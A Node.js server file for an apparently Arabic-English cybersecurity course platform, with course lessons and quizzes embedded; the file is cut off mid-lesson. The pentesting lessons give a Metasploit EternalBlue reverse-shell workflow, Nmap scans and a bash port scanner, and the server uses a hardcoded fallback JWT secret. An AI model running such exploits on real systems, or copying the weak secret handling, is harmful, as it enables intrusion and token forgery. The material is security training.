const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const Datastore = require('nedb-promises');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET = process.env.JWT_SECRET || 'cybersafe_2024_secret';
const PAYPAL_CLIENT_ID = process.env.PAYPAL_CLIENT_ID || '';
const EMAIL_USER = process.env.EMAIL_USER || '';
const EMAIL_PASS = process.env.EMAIL_PASS || '';

app.use(cors());
app.use(express.json());

// DB
const dataDir = path.join(__dirname, 'data');
fs.mkdirSync(dataDir, { recursive: true });
const db = {
  users: Datastore.create({ filename: path.join(dataDir, 'users.db'), autoload: true }),
  enrollments: Datastore.create({ filename: path.join(dataDir, 'enrollments.db'), autoload: true }),
  progress: Datastore.create({ filename: path.join(dataDir, 'progress.db'), autoload: true }),
  certificates: Datastore.create({ filename: path.join(dataDir, 'certificates.db'), autoload: true }),
  payments: Datastore.create({ filename: path.join(dataDir, 'payments.db'), autoload: true }),
};

// EMAIL
async function sendEmail(to, subject, html) {
  if (!EMAIL_USER || !EMAIL_PASS) return;
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: EMAIL_USER, pass: EMAIL_PASS }
    });
    await transporter.sendMail({ from: `"CyberSafe" <${EMAIL_USER}>`, to, subject, html });
  } catch (e) { console.log('Email error:', e.message); }
}

function welcomeEmail(name, email) {
  return sendEmail(email, '🛡 Welcome to CyberSafe!', `
    <div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#0a0e1a;color:#fff;border-radius:12px;overflow:hidden">
      <div style="background:linear-gradient(135deg,#00d4aa,#0066ff);padding:40px;text-align:center">
        <h1 style="margin:0;font-size:28px">🛡 CyberSafe</h1>
        <p style="margin:8px 0 0;opacity:.9">Your Cybersecurity Learning Journey Begins</p>
      </div>
      <div style="padding:32px">
        <h2 style="color:#00d4aa">Welcome, ${name}! 🎉</h2>
        <p style="color:#ccc;line-height:1.7">Your account has been successfully created. You now have access to world-class cybersecurity courses.</p>
        <div style="background:#111827;border-radius:8px;padding:16px;margin:20px 0">
          <p style="color:#00d4aa;margin:0 0 8px;font-weight:bold">🆓 Free Courses Available:</p>
          <p style="color:#ccc;margin:0">• Cybersecurity Fundamentals<br>• Networking Basics<br>• Security Awareness</p>
        </div>
        <a href="https://cybersafe-arabia.onrender.com" style="display:inline-block;background:linear-gradient(135deg,#00d4aa,#0066ff);color:#fff;padding:14px 32px;border-radius:8px;text-decoration:none;font-weight:bold;margin-top:8px">Start Learning →</a>
      </div>
      <div style="padding:20px;text-align:center;color:#666;font-size:12px;border-top:1px solid #1f2937">
        © 2024 CyberSafe | cybersafe-arabia.onrender.com
      </div>
    </div>`);
}

function courseCompletionEmail(name, email, courseTitle, certId) {
  return sendEmail(email, `🏆 Certificate of Completion — ${courseTitle}`, `
    <div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#0a0e1a;color:#fff;border-radius:12px;overflow:hidden">
      <div style="background:linear-gradient(135deg,#f59e0b,#ef4444);padding:40px;text-align:center">
        <div style="font-size:60px">🏆</div>
        <h1 style="margin:8px 0 0;font-size:24px">Certificate of Completion</h1>
      </div>
      <div style="padding:32px;text-align:center">
        <p style="color:#ccc;font-size:16px">This certifies that</p>
        <h2 style="color:#00d4aa;font-size:28px;margin:8px 0">${name}</h2>
        <p style="color:#ccc;font-size:16px">has successfully completed</p>
        <h3 style="color:#fff;font-size:22px;margin:8px 0">${courseTitle}</h3>
        <div style="background:#111827;border-radius:8px;padding:16px;margin:24px 0;display:inline-block">
          <p style="color:#666;margin:0 0 4px;font-size:12px">Certificate ID</p>
          <p style="color:#00d4aa;margin:0;font-weight:bold;font-family:monospace">${certId}</p>
        </div>
        <p style="color:#ccc;font-size:13px">Issued by CyberSafe | ${new Date().toLocaleDateString('en-US', {year:'numeric',month:'long',day:'numeric'})}</p>
      </div>
    </div>`);
}

// COURSES DATA
const COURSES = [
  {
    _id:'c1', title:'Cybersecurity Fundamentals', titleAr:'أساسيات الأمن السيبراني',
    description:'A comprehensive introduction to cybersecurity — core concepts, threat types, CIA Triad, and essential protection tools.',
    descriptionAr:'مدخل شامل لعالم الأمن السيبراني — المفاهيم الأساسية، أنواع التهديدات، وأدوات الحماية.',
    category:'cybersecurity', level:'beginner', price:0, isFree:true, duration:'6 hours', rating:4.8,
    studentsCount:3240, instructor:'CyberSafe Team', badge:'Most Popular',
    objectives:['Understand core cybersecurity concepts','Identify common cyber threats','Apply CIA Triad principles','Use basic security tools'],
    lessons:[
      {id:'l1',title:'What is Cybersecurity?',titleAr:'ما هو الأمن السيبراني؟',duration:'25 min',type:'reading',free:true,
        content:`<h2>What is Cybersecurity?</h2>
        <p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.</p>
        <div class="info-box">💡 <strong>Key Fact:</strong> Cybercrime is predicted to cost the world $10.5 trillion annually by 2025 (Cybersecurity Ventures).</div>
        <h3>Why Does Cybersecurity Matter?</h3>
        <p>With more people working remotely and businesses moving online, the attack surface has expanded dramatically. A single breach can cost millions of dollars and destroy a company's reputation overnight.</p>
        <h3>Core Domains of Cybersecurity</h3>
        <ul><li><strong>Network Security</strong> — Protecting network infrastructure</li><li><strong>Application Security</strong> — Securing software and apps</li><li><strong>Information Security</strong> — Protecting data integrity and privacy</li><li><strong>Operational Security</strong> — Processes for handling data assets</li><li><strong>Disaster Recovery</strong> — Business continuity planning</li></ul>
        <div class="info-box">📚 <strong>Source:</strong> NIST Cybersecurity Framework (csrc.nist.gov)</div>`,
        quiz:[{q:'What does cybersecurity primarily protect against?',options:['Physical theft only','Digital attacks on systems and networks','Hardware failures','Natural disasters'],correct:1},{q:'Which of these is NOT a core domain of cybersecurity?',options:['Network Security','Application Security','Social Media Marketing','Information Security'],correct:2}]},
      {id:'l2',title:'The CIA Triad',titleAr:'مثلث الأمان CIA',duration:'30 min',type:'reading',free:true,
        content:`<h2>The CIA Triad</h2>
        <p>The CIA Triad is the foundation of information security. It stands for <strong>Confidentiality</strong>, <strong>Integrity</strong>, and <strong>Availability</strong> — the three core principles every security professional must master.</p>
        <div class="triad-grid">
          <div class="triad-card blue"><div class="triad-icon">🔒</div><h3>Confidentiality</h3><p>Ensuring information is accessible only to authorized users. Methods: encryption, access controls, authentication.</p></div>
          <div class="triad-card green"><div class="triad-icon">✅</div><h3>Integrity</h3><p>Ensuring data is accurate and has not been tampered with. Methods: hashing, digital signatures, checksums.</p></div>
          <div class="triad-card orange"><div class="triad-icon">⚡</div><h3>Availability</h3><p>Ensuring systems and data are accessible when needed. Methods: redundancy, backups, DDoS protection.</p></div>
        </div>
        <h3>Real-World Example</h3>
        <p>Consider a bank's online system: <em>Confidentiality</em> ensures only you see your balance, <em>Integrity</em> ensures your balance is accurate, and <em>Availability</em> ensures you can access your account 24/7.</p>
        <div class="info-box">📚 <strong>Source:</strong> CISSP Official Study Guide, (ISC)²</div>`,
        quiz:[{q:'What does the "I" in CIA Triad stand for?',options:['Intelligence','Integrity','Identity','Infrastructure'],correct:1},{q:'Which principle ensures data is not modified without authorization?',options:['Confidentiality','Availability','Integrity','Authentication'],correct:2}]},
      {id:'l3',title:'Types of Cyber Threats',titleAr:'أنواع التهديدات الإلكترونية',duration:'35 min',type:'reading',free:false,
        content:`<h2>Types of Cyber Threats</h2>
        <p>Understanding threats is the first step in defending against them. Here are the most common cyber threats today:</p>
        <h3>🦠 Malware</h3>
        <p>Malicious software designed to harm systems. Types include viruses, worms, trojans, ransomware, and spyware.</p>
        <div class="code-block">Ransomware example: WannaCry (2017) infected 200,000+ computers in 150 countries, causing ~$4 billion in damages.</div>
        <h3>🎣 Phishing</h3>
        <p>Deceptive attempts to steal credentials via fake emails, websites, or messages. <strong>91% of cyberattacks begin with a phishing email</strong> (PhishMe Research).</p>
        <h3>💥 DDoS Attacks</h3>
        <p>Distributed Denial of Service — overwhelming a server with traffic to make it unavailable.</p>
        <h3>🔓 SQL Injection</h3>
        <p>Inserting malicious SQL code into input fields to manipulate databases.</p>
        <div class="code-block">Vulnerable: SELECT * FROM users WHERE username='$input'
Safe: Use prepared statements / parameterized queries</div>
        <div class="info-box">📚 <strong>Sources:</strong> OWASP Top 10, Verizon DBIR 2023</div>`,
        quiz:[{q:'What percentage of cyberattacks begin with phishing?',options:['45%','67%','91%','99%'],correct:2},{q:'What is ransomware?',options:['A security tool','Malware that encrypts files and demands payment','A type of firewall','A network protocol'],correct:1}]},
      {id:'l4',title:'Social Engineering',titleAr:'الهندسة الاجتماعية',duration:'30 min',type:'reading',free:false,
        content:`<h2>Social Engineering</h2>
        <p>Social engineering exploits human psychology rather than technical vulnerabilities. It is responsible for <strong>98% of cyberattacks</strong> in some form.</p>
        <h3>Common Techniques</h3>
        <p><strong>Pretexting:</strong> Creating a fabricated scenario to extract information. Example: "I'm from IT support, I need your password to fix your account."</p>
        <p><strong>Baiting:</strong> Leaving infected USB drives in public places, hoping someone plugs them in.</p>
        <p><strong>Tailgating:</strong> Physically following an authorized person into a restricted area.</p>
        <p><strong>Vishing:</strong> Voice phishing — phone calls impersonating banks, government agencies, or tech support.</p>
        <div class="info-box">🛡 <strong>Defense:</strong> Verify all requests through official channels. Never share credentials, even with "IT support."</div>`,
        quiz:[{q:'What does social engineering primarily exploit?',options:['Software vulnerabilities','Network weaknesses','Human psychology','Hardware flaws'],correct:2}]},
      {id:'l5',title:'Basic Security Tools',titleAr:'أدوات الأمان الأساسية',duration:'40 min',type:'reading',free:false,
        content:`<h2>Essential Security Tools</h2>
        <h3>🔥 Firewalls</h3>
        <p>Monitor and filter network traffic based on security rules. Types: packet filtering, stateful inspection, next-generation (NGFW).</p>
        <h3>🔍 Antivirus / EDR</h3>
        <p>Detect and remove malicious software. Modern Endpoint Detection and Response (EDR) solutions use AI for behavioral analysis.</p>
        <h3>🔐 Password Managers</h3>
        <p>Generate and store complex, unique passwords. Recommended: Bitwarden (open source), 1Password.</p>
        <h3>🛡 VPN</h3>
        <p>Encrypts your internet connection, masking your IP. Essential on public WiFi.</p>
        <h3>🔑 Multi-Factor Authentication (MFA)</h3>
        <p>Adds an extra layer — even if a password is stolen, attackers cannot access accounts without the second factor. <strong>MFA blocks 99.9% of account compromise attacks</strong> (Microsoft).</p>
        <div class="info-box">📚 <strong>Source:</strong> SANS Security Awareness, Microsoft Security Blog</div>`,
        quiz:[{q:'What percentage of account compromises does MFA block?',options:['50%','75%','90%','99.9%'],correct:3},{q:'Which tool is recommended for storing passwords securely?',options:['Notepad','Password Manager','Browser cookies','Email drafts'],correct:1}]},
      {id:'l6',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'30 min',type:'quiz',free:false,
        content:`<h2>Cybersecurity Fundamentals — Final Exam</h2><p>Complete all questions to receive your certificate. You need <strong>70%</strong> to pass.</p>`,
        quiz:[
          {q:'What are the three components of the CIA Triad?',options:['Control, Identity, Access','Confidentiality, Integrity, Availability','Compliance, Investigation, Analysis','Configuration, Installation, Authorization'],correct:1},
          {q:'Which attack type involves overwhelming a server with traffic?',options:['Phishing','SQL Injection','DDoS','Ransomware'],correct:2},
          {q:'What is the primary goal of social engineering?',options:['Exploiting software bugs','Manipulating people into revealing information','Breaking encryption','Overloading servers'],correct:1},
          {q:'MFA stands for:',options:['Multi-Function Application','Multi-Factor Authentication','Managed Firewall Access','Multiple File Analysis'],correct:1},
          {q:'Which principle ensures data is only accessible to authorized users?',options:['Integrity','Availability','Confidentiality','Redundancy'],correct:2}
        ]}
    ]
  },
  {
    _id:'c2', title:'Networking Fundamentals', titleAr:'أساسيات الشبكات',
    description:'Master networking concepts: OSI model, TCP/IP, DNS, firewalls, and subnetting — essential for any cybersecurity professional.',
    descriptionAr:'إتقان مفاهيم الشبكات: نموذج OSI، بروتوكولات TCP/IP، DNS، الجدران النارية، والـ Subnetting.',
    category:'networking', level:'beginner', price:0, isFree:true, duration:'8 hours', rating:4.7,
    studentsCount:2890, instructor:'CyberSafe Team', badge:'',
    objectives:['Understand the OSI model','Master TCP/IP protocols','Configure basic network security','Perform subnetting'],
    lessons:[
      {id:'l1',title:'OSI Model Deep Dive',titleAr:'نموذج OSI بالتفصيل',duration:'45 min',type:'reading',free:true,
        content:`<h2>The OSI Model</h2><p>The Open Systems Interconnection (OSI) model is a conceptual framework that standardizes network communication into 7 layers. Understanding it is fundamental to cybersecurity.</p>
        <div class="osi-table"><div class="osi-row l7"><span class="layer-num">7</span><span class="layer-name">Application</span><span class="layer-ex">HTTP, FTP, DNS, SMTP</span></div><div class="osi-row l6"><span class="layer-num">6</span><span class="layer-name">Presentation</span><span class="layer-ex">SSL/TLS, Encryption, JPEG</span></div><div class="osi-row l5"><span class="layer-num">5</span><span class="layer-name">Session</span><span class="layer-ex">NetBIOS, RPC</span></div><div class="osi-row l4"><span class="layer-num">4</span><span class="layer-name">Transport</span><span class="layer-ex">TCP, UDP</span></div><div class="osi-row l3"><span class="layer-num">3</span><span class="layer-name">Network</span><span class="layer-ex">IP, ICMP, Routing</span></div><div class="osi-row l2"><span class="layer-num">2</span><span class="layer-name">Data Link</span><span class="layer-ex">Ethernet, MAC, Switches</span></div><div class="osi-row l1"><span class="layer-num">1</span><span class="layer-name">Physical</span><span class="layer-ex">Cables, Hubs, NICs</span></div></div>
        <div class="info-box">💡 <strong>Memory trick:</strong> "All People Seem To Need Data Processing" (Application → Physical)</div>
        <div class="info-box">📚 <strong>Source:</strong> Cisco Networking Academy, CompTIA Network+</div>`,
        quiz:[{q:'At which OSI layer does SSL/TLS encryption operate?',options:['Layer 3 — Network','Layer 4 — Transport','Layer 6 — Presentation','Layer 7 — Application'],correct:2},{q:'Which layer handles IP addressing and routing?',options:['Layer 2','Layer 3','Layer 4','Layer 5'],correct:1}]},
      {id:'l2',title:'TCP/IP & Protocols',titleAr:'بروتوكولات TCP/IP',duration:'50 min',type:'reading',free:true,
        content:`<h2>TCP/IP Protocol Suite</h2><p>TCP/IP is the backbone of the internet. Understanding how it works is critical for network security.</p>
        <h3>TCP vs UDP</h3>
        <div class="compare-table"><div class="compare-header"><span>TCP</span><span>UDP</span></div><div class="compare-row"><span>✅ Reliable delivery</span><span>⚡ Fast, no guarantee</span></div><div class="compare-row"><span>Connection-oriented</span><span>Connectionless</span></div><div class="compare-row"><span>HTTP, HTTPS, FTP, SSH</span><span>DNS, VoIP, Video streaming</span></div></div>
        <h3>Three-Way Handshake</h3>
        <div class="code-block">Client → Server: SYN
Server → Client: SYN-ACK
Client → Server: ACK
[Connection Established]</div>
        <div class="info-box">🚨 <strong>Security Note:</strong> SYN flood attacks exploit the three-way handshake by sending thousands of SYN packets without completing the handshake.</div>`,
        quiz:[{q:'Which protocol guarantees reliable packet delivery?',options:['UDP','TCP','ICMP','ARP'],correct:1}]},
      {id:'l3',title:'DNS & How It Works',titleAr:'DNS وكيف يعمل',duration:'35 min',type:'reading',free:false,
        content:`<h2>Domain Name System (DNS)</h2><p>DNS is the internet's phone book — it translates human-readable domain names into IP addresses.</p>
        <div class="code-block">You type: www.google.com
DNS resolves: 142.250.80.4
Browser connects to: 142.250.80.4</div>
        <h3>DNS Attack Types</h3>
        <p><strong>DNS Spoofing / Cache Poisoning:</strong> Injecting fake DNS records to redirect users to malicious sites.</p>
        <p><strong>DNS Tunneling:</strong> Using DNS protocol to exfiltrate data or bypass firewalls.</p>
        <p><strong>DNS Amplification (DDoS):</strong> Using DNS servers to amplify attack traffic.</p>
        <div class="info-box">🛡 <strong>Defense:</strong> Use DNSSEC, DoH (DNS over HTTPS), or trusted resolvers like Cloudflare 1.1.1.1</div>`,
        quiz:[{q:'What does DNS primarily do?',options:['Encrypts network traffic','Translates domain names to IP addresses','Assigns MAC addresses','Manages firewall rules'],correct:1}]},
      {id:'l4',title:'Firewalls & IDS/IPS',titleAr:'الجدران النارية وأنظمة الكشف',duration:'45 min',type:'reading',free:false,
        content:`<h2>Firewalls, IDS & IPS</h2>
        <h3>🔥 Firewalls</h3>
        <p>Firewalls filter network traffic based on rules. Types:</p>
        <ul><li><strong>Packet Filtering</strong> — Checks IP/port, stateless</li><li><strong>Stateful Inspection</strong> — Tracks connection state</li><li><strong>NGFW (Next-Gen)</strong> — Deep packet inspection, application awareness</li></ul>
        <h3>🔍 IDS vs IPS</h3>
        <div class="compare-table"><div class="compare-header"><span>IDS (Detection)</span><span>IPS (Prevention)</span></div><div class="compare-row"><span>Monitors & alerts</span><span>Monitors & blocks</span></div><div class="compare-row"><span>Passive</span><span>Active/Inline</span></div><div class="compare-row"><span>Snort, Suricata</span><span>Snort in inline mode</span></div></div>
        <div class="info-box">📚 <strong>Source:</strong> Cisco Security, SANS Institute</div>`,
        quiz:[{q:'What is the key difference between IDS and IPS?',options:['IDS is faster','IPS actively blocks threats, IDS only detects','IDS is more expensive','IPS only monitors traffic'],correct:1}]},
      {id:'l5',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'30 min',type:'quiz',free:false,
        content:`<h2>Networking Fundamentals — Final Exam</h2><p>You need <strong>70%</strong> to pass and earn your certificate.</p>`,
        quiz:[
          {q:'How many layers does the OSI model have?',options:['4','5','7','9'],correct:2},
          {q:'Which protocol is used for reliable, connection-oriented communication?',options:['UDP','ICMP','TCP','ARP'],correct:2},
          {q:'DNS translates:',options:['IP to MAC addresses','Domain names to IP addresses','Hostnames to usernames','Ports to services'],correct:1},
          {q:'Which type of firewall tracks the state of connections?',options:['Packet filtering','Stateful inspection','Proxy firewall','Application firewall'],correct:1},
          {q:'What attack exploits the TCP three-way handshake?',options:['SQL Injection','Phishing','SYN Flood','DNS Spoofing'],correct:2}
        ]}
    ]
  },
  {
    _id:'c3', title:'Ethical Hacking & Penetration Testing', titleAr:'الاختراق الأخلاقي واختبار الاختراق',
    description:'Master penetration testing methodologies, tools (Nmap, Metasploit, Burp Suite), and professional report writing.',
    descriptionAr:'إتقان منهجيات اختبار الاختراق وأدواته: Nmap، Metasploit، Burp Suite، وكتابة التقارير الاحترافية.',
    category:'pentesting', level:'advanced', price:49, isFree:false, duration:'15 hours', rating:4.9,
    studentsCount:1430, instructor:'CyberSafe Team', badge:'Top Rated',
    objectives:['Master pentesting methodology','Use industry-standard tools','Identify and exploit vulnerabilities','Write professional pentest reports'],
    lessons:[
      {id:'l1',title:'Penetration Testing Methodology',titleAr:'منهجية اختبار الاختراق',duration:'40 min',type:'reading',free:true,
        content:`<h2>Penetration Testing Methodology</h2><p>A structured pentesting engagement follows a clear methodology to ensure comprehensive coverage and legal compliance.</p>
        <div class="phases"><div class="phase-item"><div class="phase-num">1</div><div><strong>Planning & Reconnaissance</strong><p>Define scope, rules of engagement. Gather OSINT data.</p></div></div><div class="phase-item"><div class="phase-num">2</div><div><strong>Scanning & Enumeration</strong><p>Port scanning, service detection, vulnerability scanning.</p></div></div><div class="phase-item"><div class="phase-num">3</div><div><strong>Exploitation</strong><p>Attempt to exploit discovered vulnerabilities.</p></div></div><div class="phase-item"><div class="phase-num">4</div><div><strong>Post-Exploitation</strong><p>Privilege escalation, lateral movement, persistence.</p></div></div><div class="phase-item"><div class="phase-num">5</div><div><strong>Reporting</strong><p>Document findings, risk ratings, and remediation steps.</p></div></div></div>
        <div class="info-box">⚖️ <strong>Legal:</strong> Always obtain written authorization before testing. Unauthorized access is a criminal offense.</div>
        <div class="info-box">📚 <strong>Source:</strong> PTES (Penetration Testing Execution Standard), OWASP Testing Guide</div>`,
        quiz:[{q:'What is the FIRST step in a penetration test?',options:['Exploitation','Scanning','Planning & Reconnaissance','Reporting'],correct:2},{q:'What is absolutely required before starting any penetration test?',options:['A Kali Linux VM','Written authorization','Admin credentials','A VPN'],correct:1}]},
      {id:'l2',title:'Nmap — Network Scanning',titleAr:'Nmap — مسح الشبكات',duration:'60 min',type:'reading',free:false,
        content:`<h2>Nmap — The Network Mapper</h2><p>Nmap is the industry standard for network discovery and security auditing.</p>
        <h3>Essential Nmap Commands</h3>
        <div class="code-block"># Basic scan
nmap 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1

# Service & version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (all features)
nmap -A 192.168.1.1

# Stealth SYN scan
nmap -sS 192.168.1.1

# Script scan (NSE)
nmap --script vuln 192.168.1.1</div>
        <h3>Understanding Output</h3>
        <div class="code-block">PORT    STATE  SERVICE  VERSION
22/tcp  open   ssh      OpenSSH 8.2
80/tcp  open   http     Apache 2.4.41
443/tcp open   https    nginx 1.18</div>
        <div class="info-box">📚 <strong>Source:</strong> nmap.org official documentation, "Nmap Network Scanning" by Gordon Lyon</div>`,
        quiz:[{q:'Which Nmap flag detects service versions?',options:['-O','-sS','-sV','-A'],correct:2},{q:'What does the -p- flag do?',options:['Scans using ping','Scans all 65535 ports','Scans privileged ports only','Enables packet capture'],correct:1}]},
      {id:'l3',title:'Metasploit Framework',titleAr:'إطار عمل Metasploit',duration:'75 min',type:'reading',free:false,
        content:`<h2>Metasploit Framework</h2><p>Metasploit is the world's most used penetration testing framework, used by security professionals worldwide.</p>
        <h3>Core Concepts</h3>
        <p><strong>Exploit:</strong> Code that takes advantage of a vulnerability.</p>
        <p><strong>Payload:</strong> Code that runs after successful exploitation (e.g., reverse shell).</p>
        <p><strong>Module:</strong> Self-contained code for a specific task.</p>
        <h3>Basic Workflow</h3>
        <div class="code-block">msfconsole          # Start Metasploit

search eternalblue  # Search for exploits
use exploit/windows/smb/ms17_010_eternalblue

show options        # View required settings
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

run                 # Execute the exploit</div>
        <div class="info-box">⚠️ <strong>Ethics:</strong> Only use Metasploit on systems you own or have explicit written permission to test.</div>
        <div class="info-box">📚 <strong>Source:</strong> Metasploit Unleashed (Offensive Security), Rapid7 Documentation</div>`,
        quiz:[{q:'What is a payload in Metasploit?',options:['The vulnerability being exploited','Code that runs after successful exploitation','The target IP address','The scanning module'],correct:1}]},
      {id:'l4',title:'Web Application Testing & Burp Suite',titleAr:'اختبار تطبيقات الويب',duration:'80 min',type:'reading',free:false,
        content:`<h2>Web Application Security Testing</h2>
        <h3>OWASP Top 10 (2021)</h3>
        <div class="owasp-list"><div class="owasp-item"><span class="owasp-num">A01</span><span>Broken Access Control</span></div><div class="owasp-item"><span class="owasp-num">A02</span><span>Cryptographic Failures</span></div><div class="owasp-item"><span class="owasp-num">A03</span><span>Injection (SQL, NoSQL, LDAP)</span></div><div class="owasp-item"><span class="owasp-num">A04</span><span>Insecure Design</span></div><div class="owasp-item"><span class="owasp-num">A05</span><span>Security Misconfiguration</span></div><div class="owasp-item"><span class="owasp-num">A06</span><span>Vulnerable Components</span></div><div class="owasp-item"><span class="owasp-num">A07</span><span>Authentication Failures</span></div><div class="owasp-item"><span class="owasp-num">A08</span><span>Software & Data Integrity</span></div><div class="owasp-item"><span class="owasp-num">A09</span><span>Logging & Monitoring Failures</span></div><div class="owasp-item"><span class="owasp-num">A10</span><span>Server-Side Request Forgery</span></div></div>
        <h3>Burp Suite Workflow</h3>
        <p>1. Configure browser proxy → 127.0.0.1:8080<br>2. Intercept requests in Proxy tab<br>3. Send to Repeater for manual testing<br>4. Use Scanner for automated vulnerability detection<br>5. Use Intruder for fuzzing and brute force</p>
        <div class="info-box">📚 <strong>Source:</strong> OWASP.org, PortSwigger Web Security Academy</div>`,
        quiz:[{q:'What is #1 on the OWASP Top 10 (2021)?',options:['Injection','Cryptographic Failures','Broken Access Control','XSS'],correct:2}]},
      {id:'l5',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'40 min',type:'quiz',free:false,
        content:`<h2>Ethical Hacking — Final Exam</h2><p>You need <strong>70%</strong> to pass.</p>`,
        quiz:[
          {q:'What is the correct order of pentesting phases?',options:['Exploit → Scan → Plan → Report','Plan → Scan → Exploit → Report','Scan → Plan → Report → Exploit','Report → Plan → Scan → Exploit'],correct:1},
          {q:'Which Nmap flag performs OS detection?',options:['-sV','-sS','-O','-A'],correct:2},
          {q:'In Metasploit, what is an "exploit"?',options:['A scanning tool','Code that takes advantage of a vulnerability','A payload delivery mechanism','A report generator'],correct:1},
          {q:'What does OWASP stand for?',options:['Open Web Application Security Project','Online Web Attack Security Protocol','Open Wireless Application Security Program','Organized Web App Security Platform'],correct:0},
          {q:'What is the primary purpose of Burp Suite?',options:['Network scanning','Password cracking','Web application security testing','Wireless hacking'],correct:2}
        ]}
    ]
  },
  {
    _id:'c4', title:'Linux for Security Professionals', titleAr:'Linux للمحترفين الأمنيين',
    description:'Master Linux fundamentals, bash scripting, user management, and network configuration — essential for every security professional.',
    descriptionAr:'إتقان Linux من الأوامر الأساسية إلى الـ Scripting والـ Administration — ضروري لكل مختص أمني.',
    category:'it', level:'intermediate', price:29, isFree:false, duration:'10 hours', rating:4.8,
    studentsCount:1670, instructor:'CyberSafe Team', badge:'',
    objectives:['Navigate Linux command line confidently','Manage users and permissions','Write bash scripts','Configure network interfaces'],
    lessons:[
      {id:'l1',title:'Linux Command Line Essentials',titleAr:'أساسيات سطر أوامر Linux',duration:'40 min',type:'reading',free:true,
        content:`<h2>Linux Command Line Essentials</h2><p>Linux is the operating system of choice for cybersecurity professionals. Kali Linux, Parrot OS, and Ubuntu are all Linux-based.</p>
        <h3>Essential Commands</h3>
        <div class="code-block"># Navigation
pwd          # Print working directory
ls -la       # List all files with details
cd /path     # Change directory
cd ..        # Go up one level

# Files
cat file.txt           # View file contents
cp source dest         # Copy file
mv source dest         # Move/rename file
rm -rf directory       # Remove directory (careful!)
find / -name "*.conf"  # Find files

# System
whoami       # Current user
id           # User ID and groups
ps aux       # Running processes
netstat -an  # Network connections
top          # Live system monitor</div>
        <div class="info-box">📚 <strong>Source:</strong> Linux Foundation, "The Linux Command Line" by William Shotts</div>`,
        quiz:[{q:'Which command shows your current directory?',options:['ls','cd','pwd','whoami'],correct:2}]},
      {id:'l2',title:'Users, Permissions & sudo',titleAr:'المستخدمون والصلاحيات',duration:'50 min',type:'reading',free:false,
        content:`<h2>Linux Permissions & User Management</h2>
        <h3>File Permissions</h3>
        <div class="code-block">ls -la output:
-rwxr-xr-- 1 neda users 4096 Jun 2024 script.sh

Breakdown:
- = file type (d=directory, l=symlink)
rwx = owner: read, write, execute
r-x = group: read, execute
r-- = others: read only</div>
        <h3>chmod & chown</h3>
        <div class="code-block">chmod 755 script.sh    # rwxr-xr-x
chmod 600 private.key  # rw------- (private key!)
chown neda:users file  # Change owner and group
sudo command           # Run as root</div>
        <div class="info-box">🔐 <strong>Security:</strong> The principle of least privilege — give users only the minimum permissions they need.</div>`,
        quiz:[{q:'What does chmod 600 do to a file?',options:['Makes it executable by all','Gives read/write to owner only','Removes all permissions','Makes it world-readable'],correct:1}]},
      {id:'l3',title:'Bash Scripting',titleAr:'Bash Scripting',duration:'60 min',type:'reading',free:false,
        content:`<h2>Bash Scripting for Security</h2>
        <div class="code-block">#!/bin/bash
# Simple port scanner script

TARGET=$1
echo "Scanning $TARGET..."

for port in 22 80 443 8080 3306; do
  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Port $port: OPEN"
  else
    echo "Port $port: closed"
  fi
done</div>
        <h3>Useful Security Scripts</h3>
        <div class="code-block"># Check for SUID files (potential privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Monitor failed login attempts
grep "Failed password" /var/log/auth.log | tail -20

# List listening ports
ss -tlnp</div>
        <div class="info-box">📚 <strong>Source:</strong> Advanced Bash-Scripting Guide (tldp.org), HackerSploit</div>`,
        quiz:[{q:'What does the shebang line (#!/bin/bash) do?',options:['Runs the script as root','Specifies the interpreter for the script','Makes the script executable','Imports bash libraries'],correct:1}]},
      {id:'l4',title:'Final Exam',titleAr:'الاختبار النهائي',duration:'30 min',type:'quiz',free:false,
        content:`<h2>Linux for Security — Final Exam</h2><p>You need <strong>70%</strong> to pass.</p>`,
        quiz:[
          {q:'Which command lists all running processes?',options:['ls -la','ps aux','netstat','top -l'],correct:1},
          {q:'What permission does chmod 755 set?',options:['rwxrwxrwx','rwxr-xr-x','rw-rw-rw-','rwx------'],correct:1},
          {q:'What does sudo do?',options:['Creates a new user','Executes a command as root/superuser','Lists sudo users','Removes user permissions'],correct:1},
          {q:'Which command finds files by name?',options:['search','locate only','find','grep'],correct:2}
        ]}
    ]
  },
  {
    _id:'c5', title:'Security Awareness for Everyone', titleAr:'التوعية الأمنية للجميع',
    description:'Protect yourself and your organization online — phishing, fraud, privacy, strong passwords, and safe browsing habits.',
    descriptionAr:'حماية نفسك ومؤسستك في الفضاء الرقمي — تصيد، احتيال، خصوصية، وعادات تصفح آمنة.',
    category:'awareness', level:'beginner', price:0, isFree:true, duration:'4 hours', rating:4.6,
    studentsCount:5100, instructor:'CyberSafe Team', badge:'Free',
    objectives:['Recognize phishing attacks','Create strong passwords','Protect personal privacy','Browse safely'],
    lessons:[
      {id:'l1',title:'Password Security',titleAr:'أمان كلمات المرور',duration:'25 min',type:'reading',free:true,
        content:`<h2>Password Security</h2>
        <p>Weak passwords are responsible for <strong>81% of hacking-related breaches</strong> (Verizon DBIR).</p>
        <h3>What Makes a Strong Password?</h3>
        <div class="code-block">❌ Weak:    password123, qwerty, 123456
❌ Weak:    YourName1990 (personal info)
✅ Strong:  K#9mP$vL2@nQ
✅ Better:  correct-horse-battery-staple (passphrase)
✅ Best:    Use a password manager + unique per site</div>
        <h3>Password Manager Recommendations</h3>
